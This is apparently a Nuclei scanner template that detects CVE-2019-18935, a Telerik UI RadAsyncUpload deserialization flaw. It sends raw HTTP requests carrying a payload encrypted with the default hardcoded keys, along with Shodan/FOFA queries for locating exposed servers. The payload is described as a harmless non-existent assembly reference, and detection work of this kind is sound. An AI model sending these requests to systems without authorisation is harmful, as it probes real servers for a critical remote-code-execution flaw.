id: CVE-2019-18935

info:
  name: Progress Telerik UI for ASP.NET AJAX - Insecure Deserialization RCE
  author: KrE80r
  severity: critical
  description: |
    Progress Telerik UI for ASP.NET AJAX through 2019.3.1023 contains a .NET deserialization vulnerability in the RadAsyncUpload function. This template sends a properly encrypted payload using the default hardcoded encryption keys (CVE-2017-11317) that references a non-existent assembly type. On vulnerable systems with default keys, the server attempts to deserialize the payload and returns an assembly loading error, proving the deserialization vulnerability exists. Patched systems (>= 2020.1.114) or systems with custom encryption keys will reject the payload before reaching deserialization, producing different errors.
  impact: |
    Successful exploitation allows attackers to execute arbitrary code on the web server with the privileges of the application pool identity. This vulnerability has been actively exploited by APT actors against U.S. federal agencies (CISA Advisory AA23-074A) and is listed on CISA's Known Exploited Vulnerabilities catalog.
  remediation: |
    Upgrade to Telerik UI version >= 2020.1.114 where AllowedCustomMetaDataTypes protection is enabled by default. For version 2019.3.1023 and earlier, enable the AllowedCustomMetaDataTypes configuration option. Change encryption keys from the hardcoded defaults (PrivateKeyForHashOfUploadConfiguration, PrivateKeyForEncryptionOfRadAsyncUploadConfiguration).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-18935
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a
    - https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui
    - https://github.com/noperator/CVE-2019-18935
    - https://github.com/bao7uo/RAU_crypto
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-18935
    cwe-id: CWE-502
    epss-score: 0.97478
    epss-percentile: 0.99989
    cpe: cpe:2.3:a:progress:telerik_ui_for_asp.net_ajax:*:*:*:*:*:*:*:*
  metadata:
    verified: false
    max-request: 3
    vendor: progress
    product: telerik_ui_for_asp.net_ajax
    shodan-query: http.html:"Telerik.Web.UI"
    fofa-query: body="Telerik.Web.UI"
  tags: cve,cve2019,telerik,deserialization,rce,kev,progress,asp.net,fileupload

flow: http(1) && (http(2) || http(3))
cookie-reuse: true

http:
  # Stage 1: Verify RadAsyncUpload handler is registered
  - raw:
      - |
        GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    matchers:
      - type: word
        part: body
        words:
          - "RadAsyncUpload handler is registered succesfully"
        internal: true

  # Stage 2: Send pre-computed encrypted payload with default keys (2017+ HMAC version)
  # Payload references non-existent 'NucleiSafeTestAssembly' type
  # Vulnerable systems will attempt deserialization and fail at assembly loading
  # Patched systems will reject at AllowedCustomMetaDataTypes check
  - raw:
      - |
        POST /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="rauPostData"

        ATTu5i4R+ViNFYO6kst0jC11wM/1iqH+W/isjhaDjNvisxApb4u0j+abPx+dlVUAc2vFZVC6p9dHNerSOsJtwERdtfInzIC9zwGbfTJcYmLjomW1/gI+3tJey9hBZxCCzx8v8PCMi5tV7yAK0ZRRkYLoZrV4OEerl/ciKx2ssXFE+M+VpIAwqAJ9cIAz0qq1opXyudf6WtuXsWWbVOJGA9RZrYYG9CpRAwxNwUOlfMIPvz0O6egNFvFx9ajvHrldlmw7aJVkKodY7rzySUdEH5DYyKFfLstYoxz6hzToyOzPEsPnYJ6hfUyQA7BGcP04sLOYHaOp1PMzy9IOoXH8Jy3/p2hxBlP3s7dbFHNRkvvxgir7cMYlTtEfYkf6YVJ4OlS2sQBkEE5L1R0wCcYrWsG+6I1Yu0Tdiqmi4DfGvo9mjHQgUsdB39USyvNyWZrmEcJXW9vypCjxczMWoXMWetOT8J0stP+sFeFFqqC2lPcinaBTMOsYKF3XD94TlyVBqR6agIkD0GcLxs/849ryqjJ7tlACqeZtk/CSWBebZY3kCuviq6k49j5Ko5LQjI2QpjmZhRY0AV1xOYMMp/haEFXzGiN8jjyTsZcvtfys+1fCpCzRPN2sYw/4kobGlgBHAt1NWR1+2UWrAMn7+PmQp/aUNQK9n6YkfZHXAv43o/P+gGecp636mttEgWhh3B/V3yx/SD2vXDKfTI5xncQO4q1UgE13XsFrYB0JZ6UJJUsLEdM0g23hwzNKxyGzv82psDharDGY46lpbPTrcqIAgfNNAfSmuQ2gO+2YyDgmqUA=Oa4ZQ4cximC33TuO6UaGON52I94b2GJX1/M88aPYLWI=&32vVyQnfufgWSlAgfbhuviTwCN1jJC7OQYvI12AJyBKga1ye/0+I6XH/gv/MIvu0Jou/DegTI7OVICYVbON+eJi7T7U4Ec9bSF1xHuG8UyAzJjeaHwuGBaMoiYTNNn6A5LrC2zXA5JcH/Tks7/nwbaZIeW12NWJtBIISVBI0rSpHVWt+Um8nEOtgWu/7yfkc6HHwdLW1PHcU2t5fTxQW0pQ+Bu8M8Q2yuHPyg0dzEoI7atzHKSXPgOWuY0660XArkhbQaxFEpwrH9/CwVc4arSff35KU7t0ieAe8egvq/g4=v0gctYaG7QHDqHFc7tCeAMCPdxeMEcmNMl7BLv4QHqA=
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="test.txt"
        Content-Type: text/plain

        test
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers:
      - type: word
        part: body
        words:
          - "Could not load file or assembly"
          - "NucleiSafeTestAssembly"
          - "FileNotFoundException"
          - "Assembly not found"
        condition: or
        internal: true

  # Stage 3: Fallback for pre-2017 versions without HMAC (same payload structure, no HMAC suffix)
  - raw:
      - |
        POST /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="rauPostData"

        ATTu5i4R+ViNFYO6kst0jC11wM/1iqH+W/isjhaDjNvisxApb4u0j+abPx+dlVUAc2vFZVC6p9dHNerSOsJtwERdtfInzIC9zwGbfTJcYmLjomW1/gI+3tJey9hBZxCCzx8v8PCMi5tV7yAK0ZRRkYLoZrV4OEerl/ciKx2ssXFE+M+VpIAwqAJ9cIAz0qq1opXyudf6WtuXsWWbVOJGA9RZrYYG9CpRAwxNwUOlfMIPvz0O6egNFvFx9ajvHrldlmw7aJVkKodY7rzySUdEH5DYyKFfLstYoxz6hzToyOzPEsPnYJ6hfUyQA7BGcP04sLOYHaOp1PMzy9IOoXH8Jy3/p2hxBlP3s7dbFHNRkvvxgir7cMYlTtEfYkf6YVJ4OlS2sQBkEE5L1R0wCcYrWsG+6I1Yu0Tdiqmi4DfGvo9mjHQgUsdB39USyvNyWZrmEcJXW9vypCjxczMWoXMWetOT8J0stP+sFeFFqqC2lPcinaBTMOsYKF3XD94TlyVBqR6agIkD0GcLxs/849ryqjJ7tlACqeZtk/CSWBebZY3kCuviq6k49j5Ko5LQjI2QpjmZhRY0AV1xOYMMp/haEFXzGiN8jjyTsZcvtfys+1fCpCzRPN2sYw/4kobGlgBHAt1NWR1+2UWrAMn7+PmQp/aUNQK9n6YkfZHXAv43o/P+gGecp636mttEgWhh3B/V3yx/SD2vXDKfTI5xncQO4q1UgE13XsFrYB0JZ6UJJUsLEdM0g23hwzNKxyGzv82psDharDGY46lpbPTrcqIAgfNNAfSmuQ2gO+2YyDgmqUA=&32vVyQnfufgWSlAgfbhuviTwCN1jJC7OQYvI12AJyBKga1ye/0+I6XH/gv/MIvu0Jou/DegTI7OVICYVbON+eJi7T7U4Ec9bSF1xHuG8UyAzJjeaHwuGBaMoiYTNNn6A5LrC2zXA5JcH/Tks7/nwbaZIeW12NWJtBIISVBI0rSpHVWt+Um8nEOtgWu/7yfkc6HHwdLW1PHcU2t5fTxQW0pQ+Bu8M8Q2yuHPyg0dzEoI7atzHKSXPgOWuY0660XArkhbQaxFEpwrH9/CwVc4arSff35KU7t0ieAe8egvq/g4=
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="test.txt"
        Content-Type: text/plain

        test
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Could not load file or assembly"
          - "NucleiSafeTestAssembly"
          - "FileNotFoundException"
          - "Assembly not found"
          - "Unable to load assembly"
        condition: or

      - type: word
        part: body
        words:
          - "Telerik.Web.UI"

      - type: status
        status:
          - 500

    extractors:
      - type: regex
        name: telerik_version
        part: body
        regex:
          - 'Telerik\.Web\.UI,\s*Version=([0-9]+\.[0-9]+\.[0-9]+)'
        group: 1
